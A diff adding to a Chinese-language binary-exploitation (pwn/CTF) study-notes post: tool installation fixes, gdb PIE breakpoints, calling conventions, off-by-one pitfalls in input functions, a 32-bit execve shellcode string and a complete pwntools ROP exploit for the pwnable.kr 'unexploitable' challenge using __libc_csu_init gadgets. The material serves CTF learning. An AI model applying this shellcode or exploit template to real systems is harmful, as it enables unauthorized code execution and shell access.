@@ -5,7 +5,194 @@ abbrlink: 29112
 date: 2018-06-08 09:46:21
 ---
 
+## 安装seccomp-tools
+
+```
+gem install seccomp-tools
+```
+
+如果报错:
+
+```
+ERROR:  Could not find a valid gem 'seccomp-tools' (>= 0), here is why:
+          Unable to download data from https://gems.ruby-china.org/ - bad response Not Found 404 (https://gems.ruby-china.org/specs.4.8.gz)
+```
+
+参考链接: `https://blog.csdn.net/u011374880/article/details/82218802`
+
+原因:
+
+![](/assets/pwn/20180830113356496.png)
+
+解决方法:
+
+ruby的源
+
+```
+qianfa@qianfa:~/Desktop/pwn/pwnabletw/orw$ gem source -l
+*** CURRENT SOURCES ***
+
+https://gems.ruby-china.org/
+qianfa@qianfa:~/Desktop/pwn/pwnabletw/orw$ gem sources --remove https://gems.ruby-china.org/
+https://gems.ruby-china.org/ removed from sources
+qianfa@qianfa:~/Desktop/pwn/pwnabletw/orw$ gem sources --add https://gems.ruby-china.com/
+https://gems.ruby-china.com/ added to sources
+```
+
+继续安装，再次报错:
+
+```
+Building native extensions.  This could take a while...
+ERROR:  Error installing seccomp-tools:
+	ERROR: Failed to build gem native extension.
+
+    current directory: /var/lib/gems/2.3.0/gems/seccomp-tools-1.2.0/ext/ptrace
+/usr/bin/ruby2.3 -r ./siteconf20181201-13842-4wr0lq.rb extconf.rb
+mkmf.rb can't find header files for ruby at /usr/lib/ruby/include/ruby.h
+
+extconf failed, exit code 1
+
+Gem files will remain installed in /var/lib/gems/2.3.0/gems/seccomp-tools-1.2.0 for inspection.
+Results logged to /var/lib/gems/2.3.0/extensions/x86_64-linux/2.3.0/seccomp-tools-1.2.0/gem_make.out
+```
+
+解决方法:
+
+seccomp-tools应该依赖于ruby-dev,首先安装ruby-dev
+
+```
+sudo apt-get install ruby-dev
+```
+
+又报错:
+
+```
+qianfa@qianfa:~/Desktop/pwn/pwnabletw/orw$ sudo apt-get install ruby-dev
+Reading package lists... Done
+Building dependency tree       
+Reading state information... Done
+The following additional packages will be installed:
+  libgmp-dev libgmpxx4ldbl ruby2.3-dev
+Suggested packages:
+  gmp-doc libgmp10-doc libmpfr-dev
+The following NEW packages will be installed:
+  libgmp-dev libgmpxx4ldbl ruby-dev ruby2.3-dev
+0 upgraded, 4 newly installed, 0 to remove and 24 not upgraded.
+Need to get 1,361 kB of archives.
+After this operation, 6,514 kB of additional disk space will be used.
+Do you want to continue? [Y/n] Y
+Get:1 http://cn.archive.ubuntu.com/ubuntu xenial/main amd64 libgmpxx4ldbl amd64 2:6.1.0+dfsg-2 [8,948 B]
+Get:2 http://cn.archive.ubuntu.com/ubuntu xenial/main amd64 libgmp-dev amd64 2:6.1.0+dfsg-2 [314 kB]
+Err:3 http://security.ubuntu.com/ubuntu xenial-security/main amd64 ruby2.3-dev amd64 2.3.1-2~16.04.10
+  404  Not Found [IP: 91.189.91.26 80]
+Get:4 http://cn.archive.ubuntu.com/ubuntu xenial/main amd64 ruby-dev amd64 1:2.3.0+1 [4,408 B]
+Err:3 http://security.ubuntu.com/ubuntu xenial-security/main amd64 ruby2.3-dev amd64 2.3.1-2~16.04.10
+  404  Not Found [IP: 91.189.91.26 80]
+Fetched 327 kB in 3s (88.7 kB/s)
+E: Failed to fetch http://security.ubuntu.com/ubuntu/pool/main/r/ruby2.3/ruby2.3-dev_2.3.1-2~16.04.10_amd64.deb  404  Not Found [IP: 91.189.91.26 80]
+
+E: Unable to fetch some archives, maybe run apt-get update or try with --fix-missing?
+```
+
+加上--fix-missing,还是报错，哎:
+
+```
+sudo apt-get install ruby-dev
+
+qianfa@qianfa:~/Desktop/pwn/pwnabletw/orw$ sudo apt-get install ruby-dev --fix-missing
+Reading package lists... Done
+Building dependency tree       
+Reading state information... Done
+The following additional packages will be installed:
+  libgmp-dev libgmpxx4ldbl ruby2.3-dev
+Suggested packages:
+  gmp-doc libgmp10-doc libmpfr-dev
+The following NEW packages will be installed:
+  libgmp-dev libgmpxx4ldbl ruby-dev ruby2.3-dev
+0 upgraded, 4 newly installed, 0 to remove and 24 not upgraded.
+Need to get 1,034 kB/1,361 kB of archives.
+After this operation, 6,514 kB of additional disk space will be used.
+Do you want to continue? [Y/n] Y
+Err:1 http://security.ubuntu.com/ubuntu xenial-security/main amd64 ruby2.3-dev amd64 2.3.1-2~16.04.10
+  404  Not Found [IP: 91.189.91.26 80]
+Err:1 http://security.ubuntu.com/ubuntu xenial-security/main amd64 ruby2.3-dev amd64 2.3.1-2~16.04.10
+  404  Not Found [IP: 91.189.91.26 80]
+Unable to correct missing packages.
+E: Failed to fetch http://security.ubuntu.com/ubuntu/pool/main/r/ruby2.3/ruby2.3-dev_2.3.1-2~16.04.10_amd64.deb  404  Not Found [IP: 91.189.91.26 80]
+
+E: Aborting install.
+
+```
+
+解决:
+
+首先更新源:
+
+```
+sudo apt-get update
+sudo apt-get install ruby-dev --fix-missing
+sudo gem install seccomp-tools
+```
+
+ok.
+
+## overlapping方法
+
+* how2heap_overlapping_chunk
+
+参考 how2heap-分析总结
+
+* how2heap_overlapping_chunk_2
+
+参考 how2heap-分析总结
+
+* lctf_easy_heap_tcache
+
+通过unlink进行overlapping。
+
+参考tcache_study
+
+* hitcon2018_children_tcache
+
+参考tcache_study
+
+## pwngdb 打断点
+
+遇到开启了pie的程序，可以通过以下方式打断点:
+
+```
+b *$rebase(偏移)
+```
+
+比如:
+
+```
+.text:0000000000000959 loc_959:                                ; CODE XREF: main+57↑j
+.text:0000000000000959                 cmp     [rbp+var_C], 4
+.text:000000000000095D                 jle     short loc_929
+.text:000000000000095F                 mov     edi, 539h       ; status
+.text:0000000000000964                 call    exit
+.text:0000000000000964 ; } // starts at 8D0
+```
+
+在exit打断点,可以这样:
+
+```
+b *$rebase(0x964)
+```
+
 ## 调用约定
+
+* arm32函数调用约定
+  arm32位调用约定采用ATPCS。
+  参数1~参数4 分别保存到 R0~R3 寄存器中 ，剩下的参数从右往左一次入栈，被调用者实现栈平衡，返回值存放在 R0 中。
+
+* arm64函数调用约定
+  arm64位调用约定采用AAPCS64。参数1~参数8 分别保存到 X0~X7 寄存器中 ，剩下的参数从右往左一次入栈，被调用者实现栈平衡，返回值存放在 X0 中。
+
+* 32位x86:
+
+* 64位x64
 
 32位和64位程序的区别, 更多的是体现在[调用约定(Calling Convention)](https://en.wikipedia.org/wiki/X86_calling_conventions)上. 因为64位程序有了更多的通用寄存器, 所以通常会使用寄存器来进行函数参数传递 而不是通过栈, 来获得更高的运行速度.
 
@@ -480,6 +667,16 @@ Unique gadgets found: 85
 tianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ ROPgadget --binary vuln --all | grep "pop rdi ; ret"
 0x00000000000007f3 : pop rdi ; ret
 ```
+## 32位shellcode
+
+```
+\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80
+```
+
+## 64位shellcode
+
+
+
 ## shellcode编写
 
 读取/etc/passwd
@@ -710,13 +907,13 @@ print 就是打印变量（参数是什么，就打印什么），x但因给定�
 
 差不多，区别在于打印出来的字节多少而已。
 
-## read和gets和fgets
+## read和gets和fgets和scanf和getchar
 
-gets: `char * gets(char *s)`
+* gets: `char * gets(char *s)`
 
 读取一个字符串到s指向的内存空间，直到出现换行符读到文件尾为止,最后将换行符替换为NULL做作为字符串结束。**注意，由于gets()函数无法知道读取字符串大小，因此容易出现缓冲区溢出,建议使用fgets替代**
 
-fgets: `char *  fgets(char * s, int n,FILE *stream);`
+* fgets: `char *  fgets(char * s, int n,FILE *stream);`
 
  参数; 
 
@@ -726,7 +923,7 @@ fgets: `char *  fgets(char * s, int n,FILE *stream);`
 
 该函数读入n-1个字符或者读到"\n"，然后在最后**添加\x00**
 
-fets函数会开辟一个堆块，作为缓冲区，大小视情况而定，比如：
+fgets函数会开辟一个堆块，作为缓冲区，大小视情况而定，比如：
 
 ```
 #include <stdio.h>
@@ -741,7 +938,7 @@ int main() {
 }
 ```
 
-第一次输入*23 \* 'a' + 'b' + 22 \* 'b'*，字符串首先会被读到位于堆中的缓冲区里边，再从缓冲区读取到s所在地址，该字符串超过23个字节，所以第二次执行fgets的时候，将不在需要用户输入，直接从第24位开始读取。
+第一次输入`23 * 'a' + 'b' + 22 \* 'b'`，字符串首先会被读到位于堆中的缓冲区里边，再从缓冲区读取到s所在地址，该字符串超过23个字节，所以第二次执行fgets的时候，将不在需要用户输入，直接从第24位开始读取。
 
 ```
 qianfa@qianfa:~/Desktop/huwangbei$ ./test 
@@ -750,11 +947,21 @@ aaaaaaaaaaaaaaaaaaaaaaa
 baaaaaaaaaaaaaaaaaaaaaa
 ```
 
-read: `ssize_t read(int fd, void *buf, size_t count);`
+* read: `ssize_t read(int fd, void *buf, size_t count);`
 
-读取cout个字符。直接从流中读取count个字节到buf中。	
+读取cout个字符。直接从流中读取count个字节到buf中。一般不会出现off_by_one
 
-**scanf**:  char s[20]; scanf("%20s", s); scanf遇到**空格**，不满20位，“\t”, "\n"等会停止，添加"\x00"，如果输入大于或者等于20,那么会使得s[20] = "\x00"，也就是存在off_by_one。
+* strcpy
+
+会复制'\x00',可能导致off_by_one
+
+* scanf: 
+
+char s[20]; scanf("%20s", s); scanf遇到**空格**，不满20位，“\t”, "\n"等会停止，添加"\x00"，如果输入大于或者等于20,那么会使得s[20] = "\x00"，也就是存在off_by_one。该函数在输入的数据过长时，比如0x500,也会开启一个堆块，作为缓冲区,但会立即释放。
+
+* getchar():
+
+getchar 也会开辟一个堆块，作为缓冲区，不会释放。
 
 ## mmap分配问题
 
@@ -784,6 +991,104 @@ ES(Extra Segment):附加段寄存器
 
 64位: fastbins [0x20 ~ 0x80] ，步长 0x10
 
+## 经典ROP gadgets
+
+1. __libc_csu_init方法
+
+```
+.text:00000000004005E6                 mov     rbx, [rsp+38h+var_30]
+.text:00000000004005EB                 mov     rbp, [rsp+38h+var_28]
+.text:00000000004005F0                 mov     r12, [rsp+38h+var_20]
+.text:00000000004005F5                 mov     r13, [rsp+38h+var_18]
+.text:00000000004005FA                 mov     r14, [rsp+38h+var_10]
+.text:00000000004005FF                 mov     r15, [rsp+38h+var_8]
+.text:0000000000400604                 add     rsp, 38h
+.text:0000000000400608                 retn
+```
+
+```
+.text:00000000004005D0                 mov     rdx, r15
+.text:00000000004005D3                 mov     rsi, r14
+.text:00000000004005D6                 mov     edi, r13d
+.text:00000000004005D9                 call    qword ptr [r12+rbx*8]
+```
+
+2. 一般存在"pop r15;ret" 也就存在"pop rdi;ret;"
+
+pwnable.kr-unexploitable 的exp:
+
+```
+from pwn import *
+
+io = process("./unexploitable")
+elf = ELF("./unexploitable")
+#context.log_level = "debug"
+
+pop_rbp = 0x400512
+leave_ret = 0x400576
+syscall_addr = 0x400560
+bss_addr = 0x601028 + 0x200
+sh_addr = 0x601028 + 0x400
+# rdi, rsi, rdx, rcx, r8, r9
+ 
+gadget_1 = 0x4005e6
+"""
+   0x00000000004005e6 <+102>:   mov    rbx,QWORD PTR [rsp+0x8]
+   0x00000000004005eb <+107>:   mov    rbp,QWORD PTR [rsp+0x10]
+   0x00000000004005f0 <+112>:   mov    r12,QWORD PTR [rsp+0x18]
+   0x00000000004005f5 <+117>:   mov    r13,QWORD PTR [rsp+0x20]
+   0x00000000004005fa <+122>:   mov    r14,QWORD PTR [rsp+0x28]
+   0x00000000004005ff <+127>:   mov    r15,QWORD PTR [rsp+0x30]
+   0x0000000000400604 <+132>:   add    rsp,0x38
+   0x0000000000400608 <+136>:   ret 
+"""
+ 
+gadget_2 = 0x4005d0
+"""
+   0x00000000004005d0 <+80>:    mov    rdx,r15
+   0x00000000004005d3 <+83>:    mov    rsi,r14
+   0x00000000004005d6 <+86>:    mov    edi,r13d
+   0x00000000004005d9 <+89>:    call   QWORD PTR [r12+rbx*8]
+"""
+ 
+def call_function(call_addr, arg1, arg2, arg3):
+    payload = ""
+    payload += p64(gadget_1)    # => rsp
+    payload += "A" * 8
+    payload += p64(0)           # => rbx
+    payload += p64(1)           # => 1
+    payload += p64(call_addr)   # => r12 => call addr
+    payload += p64(arg1)        # => r13 => edi => rdi
+    payload += p64(arg2)        # => r14 => rsi
+    payload += p64(arg3)        # => r15 => rdx
+    payload += p64(gadget_2)    # => rsp + 38
+    payload += "C" * 0x38
+    return payload
+    
+# use read to set rax as 0x59
+payload1 = "A" * 0x10 + p64(bss_addr) # "A" * 0x10 + p64(0) is ok too
+payload1 += call_function(elf.got['read'], 0, bss_addr, 0x200)
+payload1 += p64(pop_rbp)
+payload1 += p64(bss_addr)
+payload1 += p64(leave_ret)
+
+payload2 = p64(bss_addr + 0x8)       # p64(0x0)  is ok too
+payload2 += call_function(elf.got["read"], 0, sh_addr, 0x200)
+payload2 += call_function(sh_addr+0x10, sh_addr, 0, 0)
+print len(payload2)
+payload3 = "/bin/sh\x00".ljust(0x10, "B")
+payload3 += p64(syscall_addr)
+payload3 = payload3.ljust(59, "D")
+
+sleep(3)
+io.send(payload1)
+io.send(payload2)
+io.send(payload3)
+io.interactive()
+```
+
+
+
 ## 汇编指令大全
 
 | 操作码 | 指令        | 说明                                                         |
@@ -796,6 +1101,18 @@ ES(Extra Segment):附加段寄存器
 |        | xor op1,op2 | 将两个操作数进行[异或运算]，并将结果存放到操作数1中          |
 |        | repe        | repe是一个串操作前缀，它重复串操作指令，每重复一次ECX的值就减一,一直到CX为0或ZF为0时停止。 |
 |        | cmpsb       | cmpsb是字符串比较指令，把ESI指向的数据与EDI指向的数一个一个的进行比较 |
+
+## syscall调用方法:
+
+调用好保存在rax中，参数设置方式参照调用约定。
+
+```
+  4000b0:	48 31 c0             	xor    %rax,%rax
+  4000b3:	ba 00 04 00 00       	mov    $0x400,%edx
+  4000b8:	48 89 e6             	mov    %rsp,%rsi
+  4000bb:	48 89 c7             	mov    %rax,%rdi
+  4000be:	0f 05                	syscall        # 调用read
+```
 
 ## syscall调用表
 
